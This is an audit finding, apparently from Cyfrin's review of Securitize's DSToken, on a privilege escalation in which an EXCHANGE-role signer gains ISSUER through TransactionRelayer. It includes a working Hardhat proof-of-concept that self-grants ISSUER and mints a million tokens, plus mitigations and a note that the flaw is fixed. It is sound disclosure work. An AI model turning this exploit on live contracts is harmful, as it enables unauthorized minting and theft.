---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-05-29-cyfrin-securitize-full-investor-locks-v2-0-0-5
ingested_at: '2026-08-30T10:05:51Z'
protocol_category: []
published_at: '2026-05-29T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md
tags:
- firm:cyfrin
- report:2026-05-29-cyfrin-securitize-full-investor-locks-v2-0
title: TransactionRelayer holds permanent ISSUER role and accepts EXCHANGE-role signers,
  EXCHANGE to ISSUER privilege escalation
vuln_class: []
---

# TransactionRelayer holds permanent ISSUER role and accepts EXCHANGE-role signers, EXCHANGE to ISSUER privilege escalation

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-05-29-cyfrin-securitize-full-investor-locks-v2.0.md)_

---

**Description:** At deployment, `tasks/set-roles.ts:17` grants the `TransactionRelayer` proxy `ROLE_ISSUER` on `TrustService`. The relayer's `executePreApprovedTransaction` is `public` (no caller gate) and admits any meta-tx whose recovered signer holds `ROLE_EXCHANGE` *or* `ROLE_ISSUER`:

```solidity
// contracts/utils/TransactionRelayer.sol:120-126
function executePreApprovedTransaction(
    bytes memory signature,
    ExecutePreApprovedTransaction calldata txData
) public {
    require(txData.blockLimit >= block.number, "Transaction too old");
    _executePreApprovedTransaction(signature, txData);
}

// contracts/utils/TransactionRelayer.sol:146-162
function _executePreApprovedTransaction(...) private {
    ...
    address recovered = ECDSA.recover(digest, signature);
    uint256 approverRole = getTrustService().getRole(recovered);
    require(approverRole == ROLE_EXCHANGE || approverRole == ROLE_ISSUER, 'Invalid signature');

    noncePerInvestor[investorKey] = currentNonce + 1;
    Address.functionCall(txData.destination, txData.data);
}
```

The forwarded call at line 161 executes with `msg.sender == TransactionRelayer`, i.e. as ISSUER, regardless of the actual signer's role. Combined, this lets an EXCHANGE-role key holder reach every ISSUER-gated function in the protocol, including `TrustService.setRole` itself, where the `onlySameRole(ROLE_ISSUER)` branch (`contracts/trust/TrustService.sol:91-100`) admits ISSUER+EXCHANGE assignments. The EXCHANGE signer thereby self-grants the attacker EOA ROLE_ISSUER permanently.

The protocol's role hierarchy treats EXCHANGE as the lowest-privilege non-zero role (`utils/globals.ts:roles`, NONE=0, MASTER=1, ISSUER=2, EXCHANGE=4, TRANSFER_AGENT=8). Per the role-capability map, EXCHANGE's intended capability surface is registry / identity-management (`addWallet`, `registerInvestor`, `setCountry`, `setAttribute` on `RegistryService`), explicitly NOT issuance, rebasing, role administration, or pause control. The relayer collapses that separation.

The function's own NatSpec at `TransactionRelayer.sol:112` corroborates that this admission was unintended:

```solidity
// @param signature The signature of the transaction data signed by an authorized signer (issuer or master)
```

The docstring says "issuer or master", but the code admits "EXCHANGE or ISSUER" and rejects MASTER, the documented intent and the implemented gate diverge, with the gate accepting the lowest-trust role rather than the highest.

**Impact:** A single EXCHANGE-key compromise becomes operationally equivalent to an ISSUER-key compromise, defeating the role separation. After the escalation, the attacker EOA holds ROLE_ISSUER directly on `TrustService` and can call:

- `DSToken.issueTokens` / `issueTokensCustom` / `issueTokensWithMultipleLocks`, unlimited mint to any registered investor.
- `SecuritizeRebasingProvider.setMultiplier`, rewrites every holder's effective balance via the rebasing rate.
- `WalletManager.addPlatformWallet` / `addIssuerWallet`, tag arbitrary wallets as platform wallets, which then bypass lock checks at `ComplianceServiceLibrary.sol:209-223`.
- `TrustService.setRole(_, ROLE_ISSUER | ROLE_EXCHANGE)`, onboard additional ISSUER / EXCHANGE accounts.
- `TokenIssuer.issueTokens`, `BulkOperator.bulkIssuance`, bulk-mint pathways.

The submitter of the malicious meta-tx is unrestricted (`executePreApprovedTransaction` has no caller gate), so the EXCHANGE signer never needs to broadcast the transaction themselves; they only need to leak the signature.

The escalation is permanent, the relayer's grant of ROLE_ISSUER is unconditional and the attacker's ROLE_ISSUER is recorded directly on `TrustService`. There is no time-bound or one-shot constraint on this path.

EXCHANGE is the role typically delegated to operational bots (registry / KYC pipelines) and treated as low-trust in the documented hierarchy. Custody discipline around an EXCHANGE key is materially weaker than around ISSUER. The bug therefore expands the realistic threat model from "lose the issuance key" to "lose any registry-management key".

**Proof of Concept:** The PoC is a self-contained Hardhat test at `test/poc-h1-exchange-to-issuer-escalation.test.ts`, run against the vanilla `deploy-all` deployment (no fixture modifications). It executes the full attack and asserts the resulting state, including a refutation of the "EXCHANGE could already do this directly" counter-claim by showing that an EXCHANGE EOA calling `setRole(_, ROLE_ISSUER)` straight on `TrustService` reverts. The relayer is load-bearing for the escalation.

Run:

```sh
npx hardhat test test/poc-h1-exchange-to-issuer-escalation.test.ts
```

```javascript
/**
 * PoC for Solace H-1:
 *   TransactionRelayer holds permanent ISSUER role and accepts EXCHANGE-role
 *   signers; EXCHANGE → ISSUER privilege escalation.
 *
 * Setup (vanilla `deploy-all` deployment via the existing fixture):
 *   - `tasks/set-roles.ts:17` grants the `TransactionRelayer` proxy `ROLE_ISSUER`
 *     on `TrustService`.
 *   - `TransactionRelayer.executePreApprovedTransaction` is `public` (anyone may
 *     submit) and gates only on the recovered signer's role being EXCHANGE or
 *     ISSUER (`TransactionRelayer.sol:158`).
 *   - The forwarded call runs with `msg.sender == relayer`, i.e. as ISSUER
 *     regardless of the actual signer's role.
 *
 * Attack:
 *   1. An attacker EOA `evilSigner` is granted ROLE_EXCHANGE (modelled as a
 *      compromise of any EXCHANGE-role key, EXCHANGE is the lowest-privilege
 *      non-zero role per `utils/globals.ts:roles`).
 *   2. `evilSigner` signs an EIP-712 meta-tx whose `destination = TrustService`
 *      and `data = setRole(evilTakeover, ROLE_ISSUER)`.
 *   3. Anyone calls `executePreApprovedTransaction` with that signature.
 *   4. The relayer's gate passes (signer is EXCHANGE). The forwarded `setRole`
 *      runs as the relayer, which holds ISSUER; `onlyMasterOrIssuerOrTransferAgent`
 *      passes; `onlySameRole(ROLE_ISSUER)` passes (admits ISSUER + EXCHANGE).
 *      `evilTakeover` is now ISSUER.
 *   5. As ISSUER, `evilTakeover` directly mints tokens to itself via
 *      `dsToken.issueTokens`, bypassing every issuance control.
 *
 * Counter-claim ruled out, "EXCHANGE could already have done this directly":
 *   Calling `TrustService.setRole(_, ROLE_ISSUER)` straight from an EXCHANGE
 *   EOA reverts: the modifier `onlyMasterOrIssuerOrTransferAgent` is satisfied
 *   only by MASTER / ISSUER / TRANSFER_AGENT. The test's third step explicitly
 *   confirms the direct call reverts. The escalation requires going through the
 *   relayer.
 *
 * Counter-claim ruled out, "the NatSpec restricts who can sign":
 *   The NatSpec at TransactionRelayer.sol:112 says the signer must be "issuer
 *   or master". The code accepts EXCHANGE and rejects MASTER. This PoC
 *   exercises the code, not the NatSpec.
 */

import hre from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-toolbox/network-helpers';
import { expect } from 'chai';
import { deployDSTokenRegulated, INVESTORS } from './utils/fixture';
import { DSConstants } from '../utils/globals';
import { registerInvestor, transactionRelayerPreApproval } from './utils/test-helper';

describe('PoC - H-1: EXCHANGE → ISSUER privilege escalation via TransactionRelayer', function () {
  it('Lets an EXCHANGE-role signer self-grant ISSUER via a meta-tx forwarded by the relayer', async function () {
    const [, evilSigner, evilTakeover, victim] = await hre.ethers.getSigners();

    const {
      dsToken,
      trustService,
      transactionRelayer,
      registryService,
    } = await loadFixture(deployDSTokenRegulated);

    // --- Preconditions -----------------------------------------------------

    // The vanilla deploy script grants the relayer ROLE_ISSUER on TrustService.
    expect(await trustService.getRole(await transactionRelayer.getAddress()))
      .to.equal(DSConstants.roles.ISSUER);

    // The attacker holds the lowest-privilege non-zero role: EXCHANGE.
    await trustService.setRole(evilSigner.address, DSConstants.roles.EXCHANGE);
    expect(await trustService.getRole(evilSigner.address))
      .to.equal(DSConstants.roles.EXCHANGE);

    // The takeover address starts with no role.
    expect(await trustService.getRole(evilTakeover.address))
      .to.equal(DSConstants.roles.NONE);

    // Sanity: an EXCHANGE-role key CANNOT directly call setRole(_, ISSUER),
    // the modifier `onlyMasterOrIssuerOrTransferAgent` excludes EXCHANGE.
    await expect(
      trustService.connect(evilSigner).setRole(evilTakeover.address, DSConstants.roles.ISSUER)
    ).to.be.reverted;

    // --- The escalation ----------------------------------------------------

    // EvilSigner registers an investor id so the relayer's per-investor nonce
    // mapping has a key to work with. Any registered id works; we use a fresh
    // one to avoid colliding with the fixture's default investors.
    const evilInvestorId = 'evilExchangeInvestor';
    await registerInvestor(evilInvestorId, evilSigner.address, registryService);

    // Construct the malicious payload: setRole(evilTakeover, ROLE_ISSUER) on
    // TrustService. This is the call the attacker wants to land with the
    // relayer's ISSUER msg.sender.
    const maliciousData = trustService.interface.encodeFunctionData(
      'setRole',
      [evilTakeover.address, DSConstants.roles.ISSUER]
    );

    const block = await hre.ethers.provider.getBlock('latest');
    const blockLimit = (block?.number ?? 0) + 100;
    const nonce = await transactionRelayer.nonceByInvestor(evilInvestorId);

    const message = {
      destination: await trustService.getAddress(),
      data: maliciousData,
      nonce,
      senderInvestor: evilInvestorId,
      blockLimit,
    };

    // Sign with the EXCHANGE-role key.
    const signature = await transactionRelayerPreApproval(
      evilSigner,
      await transactionRelayer.getAddress(),
      message
    );

    // Submit. Note: the submitter (`victim` here, but it could be any address,
    // executePreApprovedTransaction is `public` with no caller gate) does NOT
    // need any role. The relayer admits the signature because the signer holds
    // EXCHANGE.
    await transactionRelayer.connect(victim).executePreApprovedTransaction(signature, message);

    // --- The damage --------------------------------------------------------

    // evilTakeover is now ISSUER, despite no MASTER or ISSUER ever signing.
    expect(await trustService.getRole(evilTakeover.address))
      .to.equal(DSConstants.roles.ISSUER);

    // As ISSUER, evilTakeover can mint tokens to itself directly, no further
    // meta-tx games needed. Issue tokens to a fresh registered investor wallet
    // (mirroring the existing relayer test's pattern):
    const victimInvestorId = 'evilTakeoverInvestor';
    await registerInvestor(victimInvestorId, evilTakeover.address, registryService);

    const beforeBalance = await dsToken.balanceOf(evilTakeover.address);
    await dsToken.connect(evilTakeover).issueTokens(evilTakeover.address, 1_000_000n);
    const afterBalance = await dsToken.balanceOf(evilTakeover.address);

    expect(afterBalance - beforeBalance).to.equal(1_000_000n);

    // --- Summary -----------------------------------------------------------
    //
    // Starting state: evilSigner holds EXCHANGE (the lowest-privilege non-zero
    // role per the documented hierarchy).
    //
    // Ending state: evilTakeover holds ISSUER and has minted tokens. No MASTER
    // or ISSUER key ever signed anything.
    //
    // From here the attacker can also:
    //   - grant additional ISSUER / EXCHANGE accounts (TrustService.setRole)
    //   - flip the rebasing multiplier (SecuritizeRebasingProvider.setMultiplier)
    //   - tag arbitrary wallets as platform wallets (WalletManager), which
    //     bypass lock checks per ComplianceServiceLibrary.sol:209-223
    //
    // A single EXCHANGE-key compromise is operationally equivalent to an
    // ISSUER-key compromise, collapsing the documented role separation.
  });
});
```

Output:

```
  PoC - H-1: EXCHANGE → ISSUER privilege escalation via TransactionRelayer
    ✔ Lets an EXCHANGE-role signer self-grant ISSUER via a meta-tx forwarded by the relayer (1177ms)

  1 passing (1s)
```

The test:

1. Loads the vanilla fixture (`deployDSTokenRegulated` → `hre.run('deploy-all', ...)` → `set-roles.ts` runs and grants the relayer ISSUER).
2. Confirms the relayer holds ROLE_ISSUER on TrustService.
3. Grants `evilSigner` ROLE_EXCHANGE (modelling any EXCHANGE-key compromise).
4. Asserts that `evilSigner` calling `trustService.setRole(evilTakeover, ROLE_ISSUER)` directly **reverts**, the only path to ISSUER is via the relayer.
5. Has `evilSigner` register an investor ID (so the relayer's per-investor nonce mapping has a key).
6. Builds the malicious meta-tx: `destination = TrustService`, `data = setRole(evilTakeover, ROLE_ISSUER)`.
7. Signs with the EXCHANGE-role key, then has a role-less third party (`victim`) submit the signed payload, proving the submitter does not need any privilege.
8. Asserts `evilTakeover` now holds ROLE_ISSUER directly on `TrustService`.
9. As ISSUER, `evilTakeover` calls `dsToken.issueTokens(evilTakeover, 1_000_000)` and the test asserts the balance increases by 1,000,000, full mint capability without ever signing as MASTER or ISSUER.

The contiguous attack - single EXCHANGE-key signature to permanent ISSUER on the attacker EOA to unrestricted mint - executes within a single block and is reproducible deterministically.

**Recommended Mitigation:** Three options, in increasing rigor - option (b) is recommended as the minimum behavioral change that closes the escalation while preserving the meta-tx UX:

1. **(a) Strip the relayer's deploy-time ISSUER grant.** Remove the `setRole(transactionRelayer, ROLE_ISSUER)` line at `tasks/set-roles.ts:17`. The relayer can still forward permissionless calls, but loses its ability to execute role-gated calls, which closes the escalation but also breaks every legitimate meta-tx flow that depends on the relayer being ISSUER (e.g. signed `issueTokens` meta-txs).

2. **(b) Enforce per-destination role-fit inside `_executePreApprovedTransaction`.** After recovering the signer's role, require that the signer's role is sufficient for the call being forwarded. This requires either (i) a destination/selector → required-role table, or (ii) re-checking the signer's role against the destination's modifier semantics. The simplest variant: require the signer's role to be at least as privileged as the relayer's own role for the destination, by re-running `trustService.getRole(recovered)` against the same modifier the destination uses. Practically, this is a `require(approverRole == ROLE_ISSUER || approverRole == ROLE_MASTER, "Insufficient signer role")` if the relayer is to remain ISSUER-only, at which point the docstring at `TransactionRelayer.sol:112` ("issuer or master") becomes consistent with the code.

3. **(c) Forward signer identity via transient storage.** Have the relayer write the recovered signer's address to transient storage before the `functionCall`, and have downstream contracts (modifiers on `TrustService`, `DSToken`, etc.) consult that transient slot to determine the effective caller for authorization. This preserves arbitrary signer/relayer combinations safely and is the most flexible, but requires changes throughout the trust-checking surface.

Alongside whichever option is chosen, fix the NatSpec discrepancy at `TransactionRelayer.sol:112` so the documentation matches the implemented gate.

Consider also:
- Bound `senderInvestor` to the signer's investor membership in `RegistryService` so the meta-tx can be attributed to a real, signer-controlled investor identity rather than letting any ISSUER/EXCHANGE key advance any investor's nonce.
- Add an event emission to `_executePreApprovedTransaction` recording the recovered signer, destination, and selector, currently the call forwards silently, hampering post-incident attribution.

**Securitize:** Fixed in [6a67cf5](https://github.com/securitize-io/dstoken/commit/6a67cf5d9e2f4829aa6517d4264e3fcdc819755c).

**Cyfrin:** Verified.

\clearpage
